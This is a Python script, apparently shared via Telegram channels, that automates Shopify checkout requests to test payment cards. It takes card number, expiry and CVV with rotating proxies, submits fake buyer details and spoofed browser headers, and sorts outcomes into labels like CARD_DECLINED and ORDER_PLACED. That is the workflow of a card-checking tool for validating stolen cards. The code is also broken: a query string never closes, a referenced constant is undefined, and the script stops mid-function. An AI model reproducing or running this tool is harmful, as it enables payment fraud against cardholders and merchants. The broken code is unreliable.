# 𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦: https://t.me/DEADLINEHERE5 
# 𝐁𝐚𝐜𝐤𝐮𝐩: https://t.me/PUNISHERHELPDESK
# 𝐃𝐞𝐯: @DEADLINEHERE5

import asyncio
import aiohttp
import json
import re
import random
import argparse
from urllib.parse import urlparse
from flask import Flask, request, jsonify
import os
import time

# Import uvicorn for ASGI server
import uvicorn

QUERY_PROPOSAL_SHIPPING = """query Proposal($alternativePaymentCurrency:AlternativePaymentCurrencyInput,$delivery:DeliveryTermsInput,$discounts:DiscountTermsInput,$payment:PaymentTermInput,$merchandise:MerchandiseTermInput,$buyerIdentity:BuyerIdentityTermInput,$taxes:TaxTermInput,$sessionInput:SessionTokenInput!,$checkpointData:String,$queueToken:String,$reduction:ReductionInput,$availableRedeemables:AvailableRedeemablesInput,$changesetTokens:[String!],$tip:TipTermInput,$note:NoteInput,$localizationExtension:LocalizationExtensionInput,$nonNegotiableTerms:NonNegotiableTermsInput,$scriptFingerprint:ScriptFingerprintInput,$transformerFingerprintV2:String,$optionalDuties:OptionalDutiesInput,$attribution:AttributionInput,$captcha:CaptchaInput,$poNumber:String,$saleAttributions:SaleAttributionsInput){session(sessionInput:$sessionInput){negotiate(input:{purchaseProposal:{alternativePaymentCurrency:$alternativePaymentCurrency,delivery:$delivery,discounts:$discounts,payment:$payment,merchandise:$merchandise,buyerIdentity:$buyerIdentity,taxes:$taxes,reduction:$reduction,availableRedeemables:$availableRedeemables,tip:$tip,note:$note,poNumber:$poNumber,nonNegotiableTerms:$nonNegotiableTerms,localizationExtension:$localizationExtension,scriptFingerprint:$scriptFingerprint,transformerFingerprintV2:$transformerFingerprintV2,optionalDuties:$optionalDuties,attribution:$attribution,captcha:$captcha,saleAttributions:$saleAttributions},checkpointData:$checkpointData,queueToken:$queueToken,changesetTokens:$changesetTokens}){__typename result{...on NegotiationResultAvailable{checkpointData queueToken buyerProposal{...BuyerProposalDetails __typename}sellerProposal{...ProposalDetails __typename}__typename}...on CheckpointDenied{redirectUrl __typename}...on Throttled{pollAfter queueToken pollUrl __typename}...on NegotiationResultFailed{__typename}__typename}errors{code localizedMessage nonLocalizedMessage localizedMessageHtml...on RemoveTermViolation{target __typename}...on AcceptNewTermViolation{target __typename}...on ConfirmChangeViolation{from to __typename}...on UnprocessableTermViolation{target __typename}...on UnresolvableTermViolation{target __typename}...on ApplyChangeViolation{target from{...on ApplyChangeValueInt{value __typename}...on ApplyChangeValueRemoval{value __typename}...on ApplyChangeValueString{value __typename}__typename}to{...on ApplyChangeValueInt{value __typename}...on ApplyChangeValueRemoval{value __typename}...on ApplyChangeValueString{value __typename}__typename}__typename}...on GenericError{__typename}...on PendingTermViolation{__typename}__typename}}__typename}}fragment BuyerProposalDetails on Proposal{buyerIdentity{...on FilledBuyerIdentityTerms{email phone customer{...on CustomerProfile{email __typename}...on BusinessCustomerProfile{email __typename}__typename}__typename}__typename}merchandiseDiscount{...ProposalDiscountFragment __typename}deliveryDiscount{...ProposalDiscountFragment __typename}delivery{...ProposalDeliveryFragment __typename}merchandise{...on FilledMerchandiseTerms{taxesIncluded merchandiseLines{stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}lineComponentsSource lineComponents{...MerchandiseBundleLineComponent __typename}components{...MerchandiseLineComponentWithCapabilities __typename}legacyFee __typename}__typename}__typename}runningTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalTaxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deferredTotal{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}subtotalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}taxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt __typename}hasOnlyDeferredShipping subtotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacySubtotalBeforeTaxesShippingAndFees{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}attribution{attributions{...on RetailAttributions{deviceId locationId userId __typename}...on DraftOrderAttributions{userIdentifier:userId sourceName locationIdentifier:locationId __typename}__typename}__typename}saleAttributions{attributions{...on SaleAttribution{recipient{...on StaffMember{id __typename}...on Location{id __typename}...on PointOfSaleDevice{id __typename}__typename}targetMerchandiseLines{...FilledMerchandiseLineTargetCollectionFragment...on AnyMerchandiseLineTargetCollection{any __typename}__typename}__typename}__typename}__typename}nonNegotiableTerms{signature contents{signature targetTerms targetLine{allLines index __typename}attributes __typename}__typename}__typename}fragment ProposalDiscountFragment on DiscountTermsV2{__typename...on FilledDiscountTerms{acceptUnexpectedDiscounts lines{...DiscountLineDetailsFragment __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment DiscountLineDetailsFragment on DiscountLine{allocations{...on DiscountAllocatedAllocationSet{__typename allocations{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}target{index targetType stableId __typename}__typename}}__typename}discount{...DiscountDetailsFragment __typename}lineAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}fragment DiscountDetailsFragment on Discount{...on CustomDiscount{title description presentationLevel allocationMethod targetSelection targetType signature signatureUuid type value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}...on CodeDiscount{title code presentationLevel allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}...on DiscountCodeTrigger{code __typename}...on AutomaticDiscount{presentationLevel title allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}fragment ProposalDeliveryFragment on DeliveryTerms{__typename...on FilledDeliveryTerms{intermediateRates progressiveRatesEstimatedTimeUntilCompletion shippingRatesStatusToken deliveryLines{destinationAddress{...on StreetAddress{handle name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on Geolocation{country{code __typename}zone{code __typename}coordinates{latitude longitude __typename}postalCode __typename}...on PartialStreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}__typename}targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}groupType deliveryMethodTypes selectedDeliveryStrategy{...on CompleteDeliveryStrategy{handle __typename}...on DeliveryStrategyReference{handle __typename}__typename}availableDeliveryStrategies{...on CompleteDeliveryStrategy{title handle custom description code acceptsInstructions phoneRequired methodType carrierName incoterms brandedPromise{logoUrl lightThemeLogoUrl darkThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name __typename}deliveryStrategyBreakdown{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}__typename}minDeliveryDateTime maxDeliveryDateTime deliveryPromisePresentmentTitle{short long __typename}displayCheckoutRedesign estimatedTimeInTransit{...on IntIntervalConstraint{lowerBound upperBound __typename}...on IntValueConstraint{value __typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}pickupLocation{...on PickupInStoreLocation{address{address1 address2 city countryCode phone postalCode zoneCode __typename}instructions name __typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}businessHours{day openingTime closingTime __typename}carrierCode carrierName handle kind name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}__typename}__typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment FilledMerchandiseLineTargetCollectionFragment on FilledMerchandiseLineTargetCollection{linesV2{...on MerchandiseLine{stableId quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}...on MerchandiseBundleLineComponent{stableId quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}...on MerchandiseLineComponentWithCapabilities{stableId quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}fragment DeliveryLineMerchandiseFragment on ProposalMerchandise{...on SourceProvidedMerchandise{__typename requiresShipping}...on ProductVariantMerchandise{__typename requiresShipping}...on ContextualizedProductVariantMerchandise{__typename requiresShipping sellingPlan{id digest name prepaid deliveriesPerBillingCycle subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}}...on MissingProductVariantMerchandise{__typename variantId}__typename}fragment SourceProvidedMerchandise on Merchandise{...on SourceProvidedMerchandise{__typename product{id title productType vendor __typename}productUrl digest variantId optionalIdentifier title untranslatedTitle subtitle untranslatedSubtitle taxable giftCard requiresShipping price{amount currencyCode __typename}deferredAmount{amount currencyCode __typename}image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}options{name value __typename}properties{...MerchandiseProperties __typename}taxCode taxesIncluded weight{value unit __typename}sku}__typename}fragment MerchandiseProperties on MerchandiseProperty{name value{...on MerchandisePropertyValueString{string:value __typename}...on MerchandisePropertyValueInt{int:value __typename}...on MerchandisePropertyValueFloat{float:value __typename}...on MerchandisePropertyValueBoolean{boolean:value __typename}...on MerchandisePropertyValueJson{json:value __typename}__typename}visible __typename}fragment ProductVariantMerchandiseDetails on ProductVariantMerchandise{id digest variantId title untranslatedTitle subtitle untranslatedSubtitle product{id vendor productType __typename}productUrl image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}properties{...MerchandiseProperties __typename}requiresShipping options{name value __typename}sellingPlan{id subscriptionDetails{billingInterval __typename}__typename}giftCard __typename}fragment ContextualizedProductVariantMerchandiseDetails on ContextualizedProductVariantMerchandise{id digest variantId title untranslatedTitle subtitle untranslatedSubtitle sku price{amount currencyCode __typename}product{id vendor productType __typename}productUrl image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}properties{...MerchandiseProperties __typename}requiresShipping options{name value __typename}sellingPlan{name id digest deliveriesPerBillingCycle prepaid subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}giftCard deferredAmount{amount currencyCode __typename}__typename}fragment LineAllocationDetails on LineAllocation{stableId quantity totalAmountBeforeReductions{amount currencyCode __typename}totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}unitPrice{price{amount currencyCode __typename}measurement{referenceUnit referenceValue __typename}__typename}allocations{...on LineComponentDiscountAllocation{allocation{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}__typename}__typename}__typename}fragment MerchandiseBundleLineComponent on MerchandiseBundleLineComponent{__typename stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}}fragment MUTATION_SUBMIT on SubmitForCompletionInput{__typename}fragment QUERY_POLL on PollForReceiptInput{__typename}fragment QUERY_PROPOSAL_DELIVERY on ProposalDeliveryInput{__typename}fragment BuyerIdentityTermInput on BuyerIdentityTermInput{__typename}fragment DeliveryTermsInput on DeliveryTermsInput{__typename}fragment DiscountTermsInput on DiscountTermsInput{__typename}fragment MerchandiseTermInput on MerchandiseTermInput{__typename}fragment PaymentTermInput on PaymentTermInput{__typename}fragment TaxTermInput on TaxTermInput{__typename}fragment SessionTokenInput on SessionTokenInput{__typename}fragment ReductionInput on ReductionInput{__typename}fragment AvailableRedeemablesInput on AvailableRedeemablesInput{__typename}fragment TipTermInput on TipTermInput{__typename}fragment NoteInput on NoteInput{__typename}fragment LocalizationExtensionInput on LocalizationExtensionInput{__typename}fragment NonNegotiableTermsInput on NonNegotiableTermsInput{__typename}fragment ScriptFingerprintInput on ScriptFingerprintInput{__typename}fragment OptionalDutiesInput on OptionalDutiesInput{__typename}fragment AttributionInput on AttributionInput{__typename}fragment CaptchaInput on CaptchaInput{__typename}fragment SaleAttributionsInput on SaleAttributionsInput{__typename}fragment AlternativePaymentCurrencyInput on AlternativePaymentCurrencyInput{__typename}fragment SubmitForCompletionInput on SubmitForCompletionInput{__typename}fragment PollForReceiptInput on PollForReceiptInput{__typename}fragment ProposalDeliveryInput on ProposalDeliveryInput{__typename}fragment BuyerIdentityTermInput on BuyerIdentityTermInput{__typename}fragment DeliveryTermsInput on DeliveryTermsInput{__typename}fragment DiscountTermsInput on DiscountTermsInput{__typename}fragment MerchandiseTermInput on MerchandiseTermInput{__typename}fragment PaymentTermInput on PaymentTermInput{__typename}fragment TaxTermInput on TaxTermInput{__typename}fragment SessionTokenInput on SessionTokenInput{__typename}fragment ReductionInput on ReductionInput{__typename}fragment AvailableRedeemablesInput on AvailableRedeemablesInput{__typename}fragment TipTermInput on TipTermInput{__typename}fragment NoteInput on NoteInput{__typename}fragment LocalizationExtensionInput on LocalizationExtensionInput{__typename}fragment NonNegotiableTermsInput on NonNegotiableTermsInput{__typename}fragment ScriptFingerprintInput on ScriptFingerprintInput{__typename}fragment OptionalDutiesInput on OptionalDutiesInput{__typename}fragment AttributionInput on AttributionInput{__typename}fragment CaptchaInput on CaptchaInput{__typename}fragment SaleAttributionsInput on SaleAttributionsInput{__typename}fragment AlternativePaymentCurrencyInput on AlternativePaymentCurrencyInput{__typename}

QUERY_POLL = """query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(id:$receiptId,sessionToken:$sessionToken){__typename ...on ProcessingReceipt{__typename}...on WaitingReceipt{__typename}...on ProcessedReceipt{__typename}...on FailedReceipt{processingError{__typename ...on PaymentFailed{code messageUntranslated __typename}...on GenericApiError{code messageUntranslated __typename}...on PaymentGatewayError{code messageUntranslated __typename}...on PaymentProviderError{code messageUntranslated __typename}...on PaymentSessionError{code messageUntranslated __typename}...on RiskError{code messageUntranslated __typename}...on ThrottledError{code messageUntranslated __typename}...on CheckoutApiError{code messageUntranslated __typename}...on CheckoutValidationError{code messageUntranslated __typename}...on CheckoutError{code messageUntranslated __typename}...on InternalError{code messageUntranslated __typename}...on ExternalError{code messageUntranslated __typename}...on UnknownError{code messageUntranslated __typename}__typename}__typename}...on ActionRequiredReceipt{action{__typename ...on RedirectAction{redirectUrl __typename}__typename}__typename}__typename}}"""
MUTATION_SUBMIT = """mutation SubmitForCompletion($input:SubmitForCompletionInput!){submitForCompletion(input:$input){__typename ...on SubmitSuccess{receipt{__typename ...on ProcessedReceipt{__typename}...on WaitingReceipt{__typename}...on ProcessingReceipt{__typename}...on FailedReceipt{__typename}...on ActionRequiredReceipt{__typename}__typename}__typename}...on SubmitFailed{reason __typename}...on SubmitRejected{errors{code localizedMessage nonLocalizedMessage __typename}__typename}...on Throttled{pollAfter queueToken pollUrl __typename}__typename}}"""


async def make_graphql_request_with_captcha_handling(session, graphql_url, params, headers, json_data, checkout_url, max_retries=3):
    for attempt in range(max_retries):
        try:
            async with session.post(graphql_url, params=params, headers=headers, json=json_data, timeout=10) as response:
                resp_text = await response.text()
                
                # Check for non-JSON content type
                if 'application/json' not in response.headers.get('Content-Type', ''):
                    print(f"Warning: Received non-JSON response (Content-Type: {response.headers.get('Content-Type')}) on attempt {attempt + 1}. Raw response: {resp_text[:200]}")
                    if attempt < max_retries - 1:
                        await asyncio.sleep(2 ** attempt) # Exponential backoff
                        continue
                    return None, resp_text, False # Indicate failure and return raw text

                if response.status != 200:
                    print(f"GraphQL request failed with status {response.status} on attempt {attempt + 1}. Response: {resp_text[:200]}")
                    if attempt < max_retries - 1:
                        await asyncio.sleep(2 ** attempt) # Exponential backoff
                        continue
                    return None, resp_text, False

                if is_captcha_required(resp_text):
                    return response, resp_text, True
                
                return response, resp_text, False
        except aiohttp.ClientError as e:
            print(f"Aiohttp client error on attempt {attempt + 1}: {e}")
            if attempt < max_retries - 1:
                await asyncio.sleep(2 ** attempt) # Exponential backoff
            else:
                return None, f"Aiohttp client error: {e}", False
        except asyncio.TimeoutError:
            print(f"Request timed out on attempt {attempt + 1}")
            if attempt < max_retries - 1:
                await asyncio.sleep(2 ** attempt) # Exponential backoff
            else:
                return None, "Request timed out", False
        except Exception as e:
            print(f"An unexpected error occurred on attempt {attempt + 1}: {e}")
            if attempt < max_retries - 1:
                await asyncio.sleep(2 ** attempt) # Exponential backoff
            else:
                return None, f"Unexpected error: {e}", False
    return None, "Max retries reached", False

def is_captcha_required(response_text):
    return "captcha" in response_text.lower() or "challenge" in response_text.lower()

def extract_clean_response(message):
    if "The requested payment method is not available." in message:
        return "Payment method not available"
    if "Your order total has changed." in message:
        return "Site not supported"
    if "Throttled" in message:
        return "Throttled"
    if "CAPTCHA_REQUIRED" in message:
        return "CAPTCHA_REQUIRED"
    if "CARD_DECLINED" in message:
        return "CARD_DECLINED"
    if "ORDER_PLACED" in message:
        return "ORDER_PLACED"
    if "OTP_REQUIRED" in message:
        return "OTP_REQUIRED"
    if "MISMATCHED_BILL" in message:
        return "MISMATCHED_BILL"
    if "Change Proxy or Site" in message:
        return "Change Proxy or Site"
    if "Unknown Result" in message:
        return "Unknown Result"
    if "Error Processing Card" in message:
        return "Error Processing Card"
    if "Invalid JSON response" in message:
        return "Invalid JSON response"
    if "Aiohttp client error" in message:
        return "Network Error"
    if "Request timed out" in message:
        return "Request Timed Out"
    if "Unexpected error" in message:
        return "Internal Server Error"
    return message

def extract_between(text, start, end):
    try:
        s = text.find(start)
        if s == -1:
            return None
        s += len(start)
        e = text.find(end, s)
        if e == -1:
            return None
        return text[s:e]
    except:
        return None

async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=None):
    try:
        url = site_url
        proxy = f"http://{proxy_str}" if proxy_str else None
        
        firstName = "John"
        lastName = "Doe"
        email = "john.doe@example.com"
        phone = "5551234567"
        street = "123 Main St"
        address2 = "Apt 4B"
        city = "Anytown"
        country_code = "US"
        s_zip = "12345"
        state = "NY"
        
        stableId = "1"
        merch = "1234567890"
        subtotal = "100.00"
        
        async with aiohttp.ClientSession() as session:
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0',
                'Accept': 'application/json',
                'Accept-Language': 'en-US,en;q=0.9',
                'Content-Type': 'application/json',
                'Origin': url,
                'Referer': url,
                'sec-ch-ua': '"Chromium";v="146", "Not-A.Brand";v="24", "Microsoft Edge";v="146"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
            }

            # Initial request to get session token and other details
            try:
                async with session.get(url, proxy=proxy, timeout=10) as resp:
                    resp.raise_for_status()
                    text = await resp.text()
                    sst = extract_between(text, '"sessionToken":"', '"')
                    queueToken = extract_between(text, '"queueToken":"', '"')
                    ident_sig = extract_between(text, 'shopify-identification-signature":"', '"')
                    
                    if not sst:
                        return False, "Failed to get session token", "UNKNOWN", "0.0", "USD"
            except aiohttp.ClientError as e:
                return False, f"Initial request failed: {e}", "UNKNOWN", "0.0", "USD"
            except asyncio.TimeoutError:
                return False, "Initial request timed out", "UNKNOWN", "0.0", "USD"
            except Exception as e:
                return False, f"Initial request unexpected error: {e}", "UNKNOWN", "0.0", "USD"

            currency = "USD"
            gateway = "UNKNOWN"
            total_price = "0.0"
            payment_identifier = None
            
            params = {'operationName': 'Proposal'}
            json_data = {
                'query': QUERY_PROPOSAL_SHIPPING,
                'variables': {
                    'sessionInput': {'sessionToken': sst},
                    'buyerIdentity': {
                        'email': email,
                        'phone': {'number': phone, 'countryCode': country_code},
                        'deliveryAddress': {
                            'streetAddress': {
                                'address1': street, 'address2': address2, 'city': city,
                                'countryCode': country_code, 'postalCode': s_zip,
                                'firstName': firstName, 'lastName': lastName,
                                'zoneCode': state, 'phone': phone
                            }
                        }
                    },
                    'merchandise': {
                        'merchandiseLines': [{
                            'stableId': stableId,
                            'merchandise': {
                                'productVariantReference': {
                                    'id': f'gid://shopify/ProductVariantMerchandise/{merch}',
                                    'variantId': f'gid://shopify/ProductVariant/{variant_id}',
                                    'properties': [],
                                    'sellingPlanId': None,
                                    'sellingPlanDigest': None
                                }
                            },
                            'quantity': {'items': {'value': 1}},
                            'expectedTotalPrice': {
                                'value': {'amount': subtotal, 'currencyCode': currency}
                            },
                            'lineComponentsSource': None,
                            'lineComponents': []
                        }]
                    },
                    'payment': {'billingAddress': {'streetAddress': {'address1': street, 'address2': address2, 'city': city, 'countryCode': country_code, 'postalCode': s_zip, 'firstName': firstName, 'lastName': lastName, 'zoneCode': state, 'phone': phone}}},
                    'delivery': {'deliveryLines': []},
                    'taxes': {'proposedTotalAmount': {'value': {'amount': '0.0', 'currencyCode': currency}}},
                    'queueToken': queueToken
                },
                'operationName': 'Proposal'
            }

            graphql_url = f'https://{urlparse(url).netloc}/checkouts/unstable/graphql'
            
            response, resp_text, captcha_solved = await make_graphql_request_with_captcha_handling(
                session, graphql_url, params, headers, json_data, url, max_retries=3
            )
            
            if not response:
                return False, f"Request failed: {resp_text}", gateway, total_price, currency
            
            if is_captcha_required(resp_text):
                return False, "CAPTCHA_REQUIRED", gateway, total_price, currency
            
            try:
                resp_json = json.loads(resp_text)
            except json.JSONDecodeError as e:
                return False, f"Invalid JSON response: {str(e)} - Raw: {resp_text[:200]}", gateway, total_price, currency

            if 'errors' in resp_json:
                errors = resp_json.get('errors', [])
                error_msgs = [e.get('message', str(e)) for e in errors[:3]]
                return False, f"GraphQL Error: {'; '.join(error_msgs)}", gateway, total_price, currency

            try:
                if 'data' not in resp_json:
                    return False, "No data in proposal response", gateway, total_price, currency
                
                session_data = resp_json['data'].get('session')
                if session_data is None:
                    return False, "Session is null", gateway, total_price, currency
                
                negotiate = session_data.get('negotiate')
                if negotiate is None:
                    return False, "Negotiate returned null", gateway, total_price, currency
                
                result = negotiate.get('result')
                if result is None:
                    return False, "Result is null", gateway, total_price, currency
                
                result_type = result.get('__typename', 'Unknown')
                
                if result_type == 'CheckpointDenied':
                    return False, f"Checkpoint Denied", gateway, total_price, currency
                
                if result_type == 'Throttled':
                    return False, "Throttled", gateway, total_price, currency
                
                if result_type == 'NegotiationResultFailed':
                    return False, "Negotiation failed", gateway, total_price, currency
                
                checkpoint_data = result.get('checkpointData')
                
                seller_proposal = result.get('sellerProposal')
                if seller_proposal is None:
                    return False, "Seller proposal is null", gateway, total_price, currency
                
                delivery_data = seller_proposal.get('delivery')
                running_total_data = seller_proposal.get('runningTotal')
                
                if not running_total_data:
                    return False, "No runningTotal in sellerProposal", gateway, total_price, currency
                
                running_total = running_total_data['value']['amount']
                
            except (KeyError, TypeError) as e:
                return False, f"Failed to parse proposal response: {str(e)}", gateway, total_price, currency

            if not delivery_data:
                return False, "No delivery data in proposal", gateway, total_price, currency
            
            delivery_type = delivery_data.get('__typename', '')
            
            if delivery_type == 'PendingTerms':
                delivery_strategy = ''
                shipping_amount = 0.0
            elif delivery_type == 'FilledDeliveryTerms':
                delivery_lines = delivery_data.get('deliveryLines', [{}])
                if delivery_lines and len(delivery_lines) > 0:
                    available_strategies = delivery_lines[0].get('availableDeliveryStrategies', [])
                    if available_strategies and len(available_strategies) > 0:
                        delivery_strategy = available_strategies[0].get('handle', '')
                        shipping_amount_data = available_strategies[0].get('amount', {}).get('value', {}).get('amount', '0')
                        try:
                            shipping_amount = float(shipping_amount_data)
                        except:
                            shipping_amount = 0.0
                    else:
                        delivery_strategy = ''
                        shipping_amount = 0.0
                else:
                    delivery_strategy = ''
                    shipping_amount = 0.0
            else:
                delivery_strategy = ''
                shipping_amount = 0.0
            
            try:
                tax_data = seller_proposal.get('tax', {})
                if tax_data and tax_data.get('__typename') == 'FilledTaxTerms':
                    tax_amount_data = tax_data.get('totalTaxAmount', {}).get('value', {}).get('amount', '0')
                    tax_amount = float(tax_amount_data)
                else:
                    tax_amount = 0.0
            except:
                tax_amount = 0.0

            payment_data = seller_proposal.get('payment', {})
            if payment_data and payment_data.get('__typename') == 'FilledPaymentTerms':
                payment_methods = payment_data.get('availablePaymentLines', [])
                for method in payment_methods:
                    payment_method = method.get('paymentMethod', {})
                    if payment_method.get('name') or payment_method.get('paymentMethodIdentifier'):
                        payment_identifier = payment_method.get('paymentMethodIdentifier')
                        displayName = payment_method.get('extensibilityDisplayName') or payment_method.get('name', 'Unknown')
                        
                        gateway = payment_method.get('extensibilityDisplayName') or payment_method.get('name', 'UNKNOWN')
                        total_price = str(float(running_total) + shipping_amount + tax_amount)
                        
                        break
            
            if not payment_identifier:
                return False, "No valid payment method found", gateway, total_price, currency
            
            json_data['query'] = QUERY_PROPOSAL_DELIVERY
            json_data['variables']['delivery']['deliveryLines'] = [{
                'destination': {
                    'streetAddress': {
                        'address1': street, 'address2': address2, 'city': city,
                        'countryCode': country_code, 'postalCode': s_zip,
                        'firstName': firstName, 'lastName': lastName,
                        'zoneCode': state, 'phone': phone
                    }
                },
                'selectedDeliveryStrategy': {
                    'deliveryStrategyByHandle': {
                        'handle': delivery_strategy if delivery_strategy else '',
                        'customDeliveryRate': False
                    },
                    'options': {}
                },
                'targetMerchandiseLines': {
                    'lines': [{'stableId': stableId or '1'}]
                },
                'deliveryMethodTypes': ['SHIPPING'],
                'expectedTotalPrice': {
                    'value': {'amount': str(shipping_amount), 'currencyCode': currency}
                },
                'destinationChanged': False
            }]
            json_data['variables']['payment']['billingAddress'] = {
                'streetAddress': {
                    'address1': street, 'address2': address2, 'city': city,
                    'countryCode': country_code, 'postalCode': s_zip,
                    'firstName': firstName, 'lastName': lastName,
                    'zoneCode': state, 'phone': phone
                }
            }
            json_data['variables']['taxes']['proposedTotalAmount']['value']['amount'] = str(tax_amount)
            json_data['variables']['buyerIdentity']['shopPayOptInPhone'] = {'number': phone}

            response, resp_text, captcha_solved = await make_graphql_request_with_captcha_handling(
                session, graphql_url, params, headers, json_data, url, max_retries=3
            )
            
            if is_captcha_required(resp_text):
                return False, "CAPTCHA_REQUIRED on delivery proposal", gateway, total_price, currency

            payload = {
                "credit_card": {
                    "number": cc,
                    "month": int(mes),
                    "year": int(ano),
                    "verification_value": cvv,
                    "start_month": None,
                    "start_year": None,
                    "issue_number": "",
                    "name": f"{firstName} {lastName}"
                },
                "payment_session_scope": urlparse(url).netloc
            }
            
            vault_headers = {
                'Content-Type': 'application/json',
                'Accept': 'application/json',
                'Accept-Language': 'en-US,en;q=0.9',
                'Origin': 'https://checkout.pci.shopifyinc.com',
                'Referer': 'https://checkout.pci.shopifyinc.com/build/a8e4a94/number-ltr.html?identifier=&locationURL=',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0',
                'sec-ch-ua': '"Chromium";v="146", "Not-A.Brand";v="24", "Microsoft Edge";v="146"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-storage-access': 'active',
            }
